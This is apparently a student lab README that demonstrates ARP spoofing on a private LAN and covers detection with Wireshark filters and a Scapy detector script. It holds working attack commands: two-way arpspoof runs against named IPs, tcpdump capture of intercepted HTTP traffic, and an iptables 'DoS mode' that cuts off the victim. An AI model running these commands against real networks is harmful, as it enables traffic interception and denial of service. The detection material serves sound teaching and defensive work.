# 🛡️ ARP Spoofing Attack Detection & Prevention

> **Man-in-the-Middle Attack Demo on Private LAN Network**  
> Platform: Windows (Victim) + Ubuntu Linux (Attacker)  
> Tools: Wireshark · Python 3 · Scapy · arpspoof · Npcap

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [What is ARP Spoofing](#-what-is-arp-spoofing)
- [Lab Setup](#-lab-setup)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [How to Run the Attack](#-how-to-run-the-attack)
- [How to Detect](#-how-to-detect)
- [Wireshark Analysis](#-wireshark-analysis)
- [Results](#-results)
- [Prevention](#-prevention)
- [Project Structure](#-project-structure)
- [Disclaimer](#-disclaimer)

---

## 📌 Project Overview

This project demonstrates a complete **ARP Spoofing / Man-in-the-Middle (MITM) attack** on a private LAN network and shows how to **detect** and **prevent** it using free open-source tools.

| Phase | Description | Tools Used |
|-------|-------------|------------|
| **Attack** | Poison ARP tables to intercept traffic | arpspoof (dsniff), Ubuntu |
| **Detect** | Catch the attack in real time | Wireshark, Python + Scapy |
| **Prevent** | Block the attack permanently | Static ARP entry (netsh) |

### Key Results Achieved

```
✔  Attack launched and MITM fully established
✔  Duplicate IP detected in under 4 seconds
✔  Attacker MAC identified: ee:f2:75:aa:f5:a6
✔  100+ fake ARP packets captured as evidence
✔  Prevention neutralised the attack completely
```

---

## 🔍 What is ARP Spoofing

**ARP (Address Resolution Protocol)** maps IP addresses to MAC addresses on a local network. It has **no authentication** — any device can send a fake ARP reply and other devices will believe it.

### Normal ARP Flow

```
Victim PC  →  "Who has 10.238.69.194? Tell me your MAC"  →  Broadcast
Router     →  "I have that IP! My MAC is 4c:d5:77:be:1c:91"  →  Victim
Victim PC  →  Saves mapping in ARP table  →  Sends data to router
```

### ARP Spoofing Attack Flow

```
Attacker   →  "I am the router! My MAC is ee:f2:75:aa:f5:a6"  →  Victim (FAKE)
Attacker   →  "I am the victim! My MAC is ee:f2:75:aa:f5:a6"  →  Router (FAKE)

Result:  Victim ←→ ATTACKER ←→ Router
         All traffic passes through attacker silently
```

### What Makes a Packet FAKE

| Property | Normal ARP Reply | Fake ARP Reply |
|----------|-----------------|----------------|
| Triggered by | Someone asked first | No request — unsolicited |
| Frequency | Once, then stops | Every 2 seconds continuously |
| MAC for IP | Always same MAC | Different MAC each time |
| Sender IP | Matches real device | Spoofed to match router |
| Wireshark flag | No warning | ⚠️ Duplicate IP warning |

---

## 🖧 Lab Setup

### Network Topology

```
┌─────────────────┐         ┌─────────────────┐
│   VICTIM PC     │         │   ATTACKER PC   │
│   Windows 10    │         │   Ubuntu Linux  │
│ IP: 10.238.69.246│        │ IP: 10.238.69.x │
│ MAC: 10:6f:d9:  │         │ MAC: ee:f2:75:  │
│      e7:ba:fd   │         │      aa:f5:a6   │
└────────┬────────┘         └────────┬────────┘
         │                           │
         └──────────┬────────────────┘
                    │
           ┌────────┴────────┐
           │     ROUTER      │
           │ IP: 10.238.69.194│
           │ MAC: 4c:d5:77:  │
           │      be:1c:91   │
           └─────────────────┘
           (All on same private WiFi)
```

### Device Details

| Device | OS | Role | IP Address | MAC Address |
|--------|----|------|------------|-------------|
| Victim PC | Windows 10/11 | Target Machine | 10.238.69.246 | 10:6f:d9:e7:ba:fd |
| Attacker PC | Ubuntu Linux | Launches Attack | 10.238.69.x | ee:f2:75:aa:f5:a6 |
| Router/Gateway | Firmware | Network Gateway | 10.238.69.194 | 4c:d5:77:be:1c:91 |

---

## 📦 Requirements

### On Windows (Victim/Monitor PC)

| Tool | Version | Purpose | Download |
|------|---------|---------|----------|
| Python 3 | 3.8+ | Run detector script | https://python.org |
| Npcap | Latest | Packet capture driver | https://npcap.com |
| Wireshark | Latest | GUI packet analysis | https://wireshark.org |
| Scapy | Latest | Python packet library | `pip install scapy` |
| colorama | Latest | Coloured terminal output | `pip install colorama` |

### On Ubuntu Linux (Attacker PC)

| Tool | Purpose | Install |
|------|---------|---------|
| dsniff | Contains arpspoof tool | `sudo apt install dsniff` |
| net-tools | Network utilities | `sudo apt install net-tools` |
| aircrack-ng | WiFi attack tools | `sudo apt install aircrack-ng` |
| tcpdump | CLI packet capture | `sudo apt install tcpdump` |

---

## ⚙️ Installation

### Windows Setup

```bash
# Step 1 — Install Python (check Add to PATH during install)
# Download from https://python.org/downloads

# Step 2 — Install Npcap
# Download from https://npcap.com
# Check "WinPcap API-compatible Mode" during install

# Step 3 — Install Python libraries
pip install scapy colorama

# Step 4 — Verify installation
python -c "from scapy.all import *; print('Scapy OK')"
```

### Ubuntu Setup

```bash
# Step 1 — Update packages
sudo apt update

# Step 2 — Install attack tools
sudo apt install dsniff net-tools aircrack-ng tcpdump

# Step 3 — Find your network interface
ip link show
ip route | grep default
```

---

## 🚀 How to Run the Attack

> ⚠️ **Only run this on your own private network. Unauthorised use is illegal.**

### Step 1 — Find IP Addresses

```bash
# On Ubuntu — find router IP
ip route | grep default
# Output: default via 10.238.69.194 dev enp3s0

# On Windows — find victim IP
ipconfig
# Look for: IPv4 Address . . . : 10.238.69.246
#           Default Gateway . . : 10.238.69.194
```

### Step 2 — Enable IP Forwarding (Ubuntu)

```bash
# Allow packets to pass through attacker so victim stays online
sudo sysctl -w net.ipv4.ip_forward=1

# Verify it is enabled
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

### Step 3 — Launch ARP Spoof Attack (Two Terminals)

```bash
# Terminal 1 — Tell victim that attacker = router
sudo arpspoof -i enp3s0 -t 10.238.69.246 10.238.69.194

# Terminal 2 — Tell router that attacker = victim
sudo arpspoof -i enp3s0 -t 10.238.69.194 10.238.69.246
```

Both terminals will show continuous output like:
```
4c:d5:77:be:1c:91 ee:f2:75:aa:f5:a6 0806 42: arp reply 10.238.69.194 is-at ee:f2:75:aa:f5:a6
4c:d5:77:be:1c:91 ee:f2:75:aa:f5:a6 0806 42: arp reply 10.238.69.194 is-at ee:f2:75:aa:f5:a6
```

### Step 4 — Capture Intercepted Traffic (Optional)

```bash
# See all intercepted HTTP traffic in real time
sudo tcpdump -i enp3s0 -A 'tcp port 80'

# Save captured packets to file
sudo tcpdump -i enp3s0 -w intercepted.pcap
```

### Step 5 — Block Victim Network Completely (DoS Mode)

```bash
# Turn OFF IP forwarding — traffic arrives but is dropped
sudo sysctl -w net.ipv4.ip_forward=0

# Or use iptables to drop all victim packets
sudo iptables -A FORWARD -s 10.238.69.246 -j DROP
sudo iptables -A FORWARD -d 10.238.69.246 -j DROP

# To unblock later
sudo iptables -D FORWARD -s 10.238.69.246 -j DROP
sudo iptables -D FORWARD -d 10.238.69.246 -j DROP
```

---

## 🔎 How to Detect

### Method A — Wireshark (Windows)

1. Open Wireshark as Administrator
2. Select your WiFi or Ethernet adapter
3. Click the blue shark fin to start capture
4. Apply these filters one by one:

```
# Show all ARP traffic — look for flooding every 2 seconds
arp

# BEST FILTER — shows only duplicate IP events
arp.duplicate-address-detected

# Show only ARP replies — see volume of fake packets
arp.opcode == 2

# Show all victim traffic being intercepted
ip.src == 10.238.69.246
```

**What to look for:**
- 🟡 Yellow highlighted rows = Wireshark automatic attack detection
- Same message repeating every ~2 seconds = arpspoof running
- Message: `Duplicate IP address detected` = ARP poisoning confirmed

### Method B — Python Detector Script (Windows)

Save the following as `arp_detector.py`:

```python
from scapy.all import *
from colorama import Fore, Style, init
import datetime
import os

init(autoreset=True)

arp_table = {}
alert_count = 0

def get_interface():
    print(Fore.CYAN + "\n=== Available Network Interfaces ===")
    interfaces = get_if_list()
    for i, iface in enumerate(interfaces):
        print(f"{i}: {iface}")
    choice = input("\nEnter interface number to monitor: ")
    try:
        return interfaces[int(choice)]
    except:
        return conf.iface

def detect_arp_spoof(pkt):
    global alert_count
    if pkt.haslayer(ARP) and pkt[ARP].op == 2:
        ip  = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")

        if ip in arp_table:
            if arp_table[ip] != mac:
                alert_count += 1
                print(Fore.RED + f"\n{'='*55}")
                print(Fore.RED + f"  [!!!] ARP SPOOFING DETECTED!")
                print(Fore.RED + f"{'='*55}")
                print(Fore.YELLOW + f"  Time     : {timestamp}")
                print(Fore.YELLOW + f"  IP       : {ip}")
                print(Fore.YELLOW + f"  Real MAC : {arp_table[ip]}")
                print(Fore.RED    + f"  Fake MAC : {mac}")
                print(Fore.YELLOW + f"  Total Alerts: {alert_count}")
                print(Fore.RED + f"{'='*55}\n")
            else:
                print(Fore.GREEN + f"[OK]  {timestamp} | {ip} → {mac}")
        else:
            arp_table[ip] = mac
            print(Fore.BLUE + f"[NEW] {timestamp} | Learned: {ip} → {mac}")

def main():
    if os.name == 'nt':
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(Fore.RED + "[ERROR] Run as Administrator!")
            return

    iface = get_interface()
    print(Fore.GREEN + f"\n[*] Monitoring on: {iface}")
    print(Fore.YELLOW + "[*] Press CTRL+C to stop\n")

    try:
        sniff(iface=iface, filter="arp", prn=detect_arp_spoof, store=0)
    except KeyboardInterrupt:
        print(Fore.CYAN + f"\n[*] Total alerts: {alert_count}")

if __name__ == "__main__":
    main()
```

Run as Administrator:

```cmd
python arp_detector.py
```

**Expected Output During Attack:**

```
[NEW] 14:23:01 | Learned: 10.238.69.194 → 4c:d5:77:be:1c:91
[NEW] 14:23:02 | Learned: 10.238.69.246 → 10:6f:d9:e7:ba:fd

=======================================================
  [!!!] ARP SPOOFING DETECTED!
=======================================================
  Time     : 14:23:05
  IP       : 10.238.69.194
  Real MAC : 4c:d5:77:be:1c:91
  Fake MAC : ee:f2:75:aa:f5:a6
  Total Alerts: 1
=======================================================
```

---

## 📊 Wireshark Analysis

### Screenshot 1 — `arp` Filter Results

```
Packet 3172 — Who has 10.238.69.246? Tell 10.238.69.3
              → NORMAL: ARP request broadcast

Packet 3173 — 10.238.69.246 is at 10:6f:d9:e7:ba:fd
              → NORMAL: Victim PC replies with real MAC

Packet 3178 — 10.238.69.194 is at 4c:d5:77:be:1c:91
              → SUSPICIOUS: Unsolicited reply, nobody asked

Packet 3183, 3189, 3208, 3211 ... (repeating every ~2s)
              → ATTACK: arpspoof flooding confirmed
```

### Screenshot 2 — `arp.duplicate-address-detected` Filter

```
5 duplicate events detected:
  Packets: 591, 594, 617, 623, 640
  Interval: every ~1-2 seconds
  
Yellow bar at bottom:
  [Duplicate IP address detected for 10.238.69.194
  (ee:f2:75:aa:f5:a6) - also in use by 4c:d5:77:be:1c:91]

  REAL MAC: 4c:d5:77:be:1c:91  ← Router
  FAKE MAC: ee:f2:75:aa:f5:a6  ← Attacker
```

### Screenshot 3 — `arp.opcode == 2` Filter

```
Packets 5731 → 6474 captured in ~34 seconds
= 100+ fake ARP reply packets in 34 seconds

Packet timing:
  5731 @ 408.95s
  5732 @ 410.95s  ← 2 second gap (arpspoof interval)
  5743 @ 412.95s  ← 2 second gap
  ...continues...

Same yellow warning at bottom:
  Duplicate IP for 10.238.69.194 confirmed again
```

### Fake Packet Structure (42 bytes)

```
┌─────────────────────────────────────────────────────┐
│              FAKE ARP PACKET ANATOMY                │
├────────────────────┬────────────────────────────────┤
│ Field              │ Value                          │
├────────────────────┼────────────────────────────────┤
│ Hardware Type      │ Ethernet (1)                   │
│ Protocol Type      │ IPv4 (0x0800)                  │
│ Opcode             │ reply (2) ← unsolicited        │
│ Sender MAC         │ ee:f2:75:aa:f5:a6 ← ATTACKER  │
│ Sender IP          │ 10.238.69.194 ← SPOOFED router │
│ Target MAC         │ 10:6f:d9:e7:ba:fd ← victim    │
│ Target IP          │ 10.238.69.246 ← victim         │
└────────────────────┴────────────────────────────────┘

EFFECT: Victim updates ARP table:
  BEFORE:  10.238.69.194 → 4c:d5:77:be:1c:91 (real router)
  AFTER:   10.238.69.194 → ee:f2:75:aa:f5:a6 (attacker!)
```

### How Fake Packets Were Identified — 5 Methods

| # | Method | Normal Behaviour | Attack Behaviour |
|---|--------|-----------------|-----------------|
| 1 | Request before reply | Always has request first | Reply sent with NO request |
| 2 | Frequency | Once per request, stops | Every 2 seconds forever |
| 3 | MAC consistency | One IP = one MAC always | Same IP shows two MACs |
| 4 | Packet volume | Few packets per minute | 100+ packets per minute |
| 5 | Wireshark alert | No warning | Yellow duplicate IP warning |

---

## 📈 Results

### Attack Timeline

| Time | Event | Detection Status |
|------|-------|-----------------|
| T + 0s | arpspoof started on Ubuntu | Not yet detected |
| T + 2s | First fake ARP reply sent to victim | Python: [NEW] entry learned |
| T + 4s | Second reply with DIFFERENT MAC | Python: **ALERT triggered** |
| T + 6s | Wireshark duplicate IP warning | Wireshark: **Yellow highlight** |
| T + 10s | All victim traffic via attacker | **MITM fully established** |
| T + 30s | Static ARP entry added | **Attack neutralised** |

### Evidence Summary

| Evidence | Details | Significance |
|----------|---------|-------------|
| ARP flood | 100+ packets in 34 seconds | arpspoof tool confirmed running |
| Duplicate IP | `10.238.69.194` has 2 MACs | ARP poisoning confirmed |
| Attacker MAC | `ee:f2:75:aa:f5:a6` identified | Attacker device fingerprinted |
| Fake Opcode | Opcode=2 without Opcode=1 before it | Unsolicited reply = fake packet |
| 5 warnings | Wireshark auto-detected 5 events | Sustained attack, not a glitch |

---
